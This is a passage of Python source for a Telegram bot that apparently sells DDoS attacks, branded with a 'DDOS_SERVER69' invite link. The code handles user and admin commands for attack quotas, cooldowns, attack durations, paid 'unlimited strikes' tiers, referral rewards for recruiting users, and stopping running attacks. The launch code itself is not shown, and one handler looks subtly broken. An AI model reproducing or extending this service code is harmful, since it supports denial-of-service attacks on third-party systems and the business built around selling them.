        "⚡ **/check_cooldown** - Cooldown Status! ⏳\n"
        "⚡ **/check_remaining_attack** - Strikes Left! 💥\n"
    )

    overlord_commands = (
        "👑 **Overlord Commands** 👑\n\n"
        "⚡ **/stats** - Bot Stats! 📊\n"
        "⚡ **/broadcast <message>** - Announce to All! 📢\n"
        "⚡ **/stop** - Halt Attacks! 🛑\n"
        "⚡ **/setcooldown <seconds>** - Set Cooldown! ⏳\n"
        "⚡ **/setmaxattack <limit>** - Set Attack Limit! 💥\n"
        "⚡ **/setmaxtime <user> <overlord>** - Set Duration! ⏰\n"
        "⚡ **/reset <user_id>** - Reset User! 🔄\n"
        "⚡ **/viewusers** - List Users! 👥\n"
        "⚡ **/shutdown** - Stop Bot! 🛑\n"
    )

    if is_overlord:
        response = f"{user_commands}\n{overlord_commands}\n💎 **Unlock Full Power: /start** 💎\n{branded_footer()} 😍🤗"
    else:
        response = f"{user_commands}\n💎 **Get Unlimited Power: /start** 💎\n{branded_footer()} 😍🤗"

    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌\n"
                              "⚠️ **Access Denied!** ⚠️👑"
                              f"{branded_footer()} 😓😢")
        return

    total_users = len(user_data)
    total_attacks = sum(len(attacks) for attacks in attack_history.values())
    active_paid_users = sum(1 for user in PAID_USERS if is_paid_user(user))
    bot.reply_to(message, 
                 f"📊 **Bot Stats** 📊\n\n"
                 f"👥 **Users:** {total_users}\n"
                 f"💥 **Strikes:** {total_attacks}\n"
                 f"💎 **Paid Users:** {active_paid_users}"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌\n"
                              "⚠️ **Access Denied!** ⚠️👑"
                              f"{branded_footer()} 😓😢")
        return

    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "❌ **Usage: /broadcast <message>** ❌\n"
                              "📌 **Example:** /broadcast New Plans Out!"
                              f"{branded_footer()} 😓😢")
        return

    broadcast_message = command[1]
    for user_id in user_data:
        try:
            bot.send_message(user_id, 
                             f"📢 **Overlord Alert** 📢\n\n"
                             f"{broadcast_message}\n\n"
                             f"⚡ **Stay Ready!** ⚡"
                             f"{branded_footer()} 😍🤗")
        except Exception as e:
            logging.error(f"Error broadcasting to {user_id}: {e}")
    bot.reply_to(message, "✅ **Broadcast Sent!** ✅\n"
                          f"📢 **All Users Notified!** 📢"
                          f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌\n"
                              "⚡ **Can’t Stop This!** ⚡"
                              f"{branded_footer()} 😓😢")
        return
    with attack_lock:
        if global_attack_running:
            global_attack_running = False
            bot.reply_to(message, "🛑 **Attack Stopped (Free Users)!** 🛑\n"
                                  "⚡ **Done!** ⚡"
                                  f"{branded_footer()} 😍🤗")
        else:
            bot.reply_to(message, "⚡ **No Attack Running!** ⚡"
                                  f"{branded_footer()} 😓😢")
    with overlord_attack_lock:
        if overlord_attack_running:
            overlord_attack_running = False
            bot.reply_to(message, "🛑 **Overlord Attack Stopped!** 🛑\n"
                                  "⚡ **Done!** ⚡"
                                  f"{branded_footer()} 😍🤗")
        else:
            bot.reply_to(message, "⚡ **No Overlord Attack Running!** ⚡"
                                  f"{branded_footer()} 😓😢")

@bot.message_handler(commands=['invite'])
def invite_link(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    if not (user_id in overlord_id or is_paid_user(user_id)) and not is_user_in_group(user_id):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} First!** 🌪️\n"
                              f"⚡ **Required for Free Users!** ⚡"
                              f"{branded_footer()} 😓😢")
        return
    invite_link = f"https://t.me/DDOS_SERVER69?start={user_id}"
    bot.reply_to(message, 
                 f"📩 **{user_name}, Your Invite Link!** 📩\n"
                 f"🔗 **{invite_link}**\n"
                 f"🎁 **+1 Strike Per Invite (Max {MAX_REFERRAL_BONUS})!** 🎉"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['leaderboard'])
def leaderboard(message):
    user_id = str(message.from_user.id)
    if not (user_id in overlord_id or is_paid_user(user_id)) and not is_user_in_group(user_id):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} First!** 🌪️\n"
                              f"⚡ **Required for Free Users!** ⚡"
                              f"{branded_footer()} 😓😢")
        return
    if not referral_data:
        bot.reply_to(message, "🏆 **Leaderboard Empty!** 🏆\n"
                              "⚡ **Invite Friends to Rank Up!** ⚡"
                              f"{branded_footer()} 😓😢")
        return
    sorted_referrals = sorted(referral_data.items(), key=lambda x: x[1], reverse=True)[:5]
    leaderboard_text = "\n".join([f"🏅 **{idx+1}. ID: {uid}** | **Invites: {count}**" 
                                  for idx, (uid, count) in enumerate(sorted_referrals)])
    bot.reply_to(message, 
                 f"🏆 **Top Recruiters** 🏆\n\n"
                 f"{leaderboard_text}\n\n"
                 f"⚡ **Invite More to Win!** ⚡"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    user_id = str(message.from_user.id)
    if user_id in overlord_id or is_paid_user(user_id):
        bot.reply_to(message, "⚡ **No Cooldown for You!** ⚡\n"
                              "🌩️ **Strike Anytime!** 🌩️"
                              f"{branded_footer()} 😍🤗")
        return
    user = user_data.get(user_id, {'last_attack': None})
    now = datetime.datetime.now()
    if user['last_attack'] and (now - user['last_attack']).total_seconds() < COOLDOWN_TIME:
        remaining = int(COOLDOWN_TIME - (now - user['last_attack']).total_seconds())
        bot.reply_to(message, f"⏳ **Cooldown: {remaining}s Left!** ⏳\n"
                              f"💎 **Skip Cooldowns with Thunder Arsenal! /start** 💎"
                              f"{branded_footer()} 😓😢")
    else:
        bot.reply_to(message, "⚡ **No Cooldown - Strike Now!** ⚡"
                              f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id in overlord_id or is_paid_user(user_id):
        bot.reply_to(message, "⚡ **Unlimited Strikes!** ⚡\n"
                              "🌩️ **Keep Attacking!** 🌩️"
                              f"{branded_footer()} 😍🤗")
    elif user_id not in user_data:
        bot.reply_to(message, f"⚡ **Full Strikes Ready!** ⚡\n"
                              f"💥 **Remaining:** {ATTACK_LIMIT} 💥"
                              f"{branded_footer()} 😍🤗")
    else:
        user = user_data[user_id]
        total_attacks = user['attacks'] - user.get('referral_bonus', 0)
        remaining = ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks
        bot.reply_to(message, f"⚡ **Strikes Left!** ⚡\n"
                              f"💥 **Remaining:** {remaining} 💥\n"
                              f"💎 **Go Unlimited with Thunder Arsenal! /start** 💎"
                              f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌"
                              f"{branded_footer()} 😓😢")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚡ **Usage: /setcooldown <seconds>** ⚡"
                              f"{branded_footer()} 😓😢")
        return
    global COOLDOWN_TIME
    COOLDOWN_TIME = int(command[1])
    bot.reply_to(message, f"⏳ **Cooldown Set: {COOLDOWN_TIME}s!** ⏳"
                          f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['setmaxattack'])
def set_max_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌"
                              f"{branded_footer()} 😓😢")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚡ **Usage: /setmaxattack <limit>** ⚡"
                              f"{branded_footer()} 😓😢")
        return
    global ATTACK_LIMIT
    ATTACK_LIMIT = int(command[1])
    bot.reply_to(message, f"💥 **Max Attacks Set: {ATTACK_LIMIT}!** 💥"
                          f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['setmaxtime'])
def set_max_time(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌"
                              f"{branded_footer()} 😓😢")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "⚡ **Usage: /setmaxtime <user_duration> <overlord_duration>** ⚡"
                              f"{branded_footer()} 😓😢")
        return
    global USER_MAX_DURATION, USER_OVERLORD_DURATION
    USER_MAX_DURATION = int(command[1])
    USER_OVERLORD_DURATION = int(command[2])
    bot.reply_to(message, f"⏰ **Max Time Set!** ⏰\n"
                          f"Users: {USER_MAX_DURATION}s | Overlords: {USER_OVERLORD_DURATION}s"
                          f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['reset'])
def reset_user(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌"
                              f"{branded_footer()} 😓😢")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚡ **Usage: /reset <user_id>** ⚡"
                              f"{branded_footer()} 😓😢")
        return
    target_id = command[1]
    if target_id in overlord_id:
        bot.reply_to(message, "❌ **Can’t Reset Overlords!** ❌"
                              f"{branded_footer()} 😓😢")
        return
    user_data[target_id] = {
        'attacks': 0,
        'last_reset': datetime.datetime.now(),
        'last_attack': None,
        'referral_bonus': user_data.get(target_id, {}).get('referral_bonus', 0),
        'mission_attacks': 0,
        'mission_invites': 0,
        'mission_reset': datetime.datetime.now()
    }
    save_users()
    bot.reply_to(message, f"✅ **User {target_id} Reset!** ✅"
                          f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌"
                              f"{branded_footer()} 😓😢")
        return
    user_list = []
    for uid, data in user_data.items():
        if uid in overlord_id:
            continue
        total_attacks = data['attacks'] - data.get('referral_bonus', 0)
        remaining = ATTACK_LIMIT + data.get('referral_bonus', 0) - total_attacks
        rank, points = get_user_rank(uid)
        user_list.append(f"👤 **ID:** {uid}\n"
                         f"🎖️ **Rank:** {rank}\n"
                         f"💾 **Points:** {points}\n"
                         f"💥 **Attacks:** {total_attacks}\n"
                         f"⚡ **Remaining:** {remaining}\n")
    bot.reply_to(message, f"📜 **User List** 📜\n\n" + "\n".join(user_list) +
                          f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['shutdown'])
def shutdown_bot(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, "❌ **Overlords Only!** ❌"
                              f"{branded_footer()} 😓😢")
        return
    bot.reply_to(message, "🛑 **Shutting Down!** 🛑\n"
                          "⚡ **Bot Off!** ⚡"
                          f"{branded_footer()} 😍🤗")
    sys.exit()

# Start the bot 🚀🌟
load_users()
load_feedback_hashes()
load_referrals()
load_attack_history()
load_ranks()
load_paid_users()

bot.polling()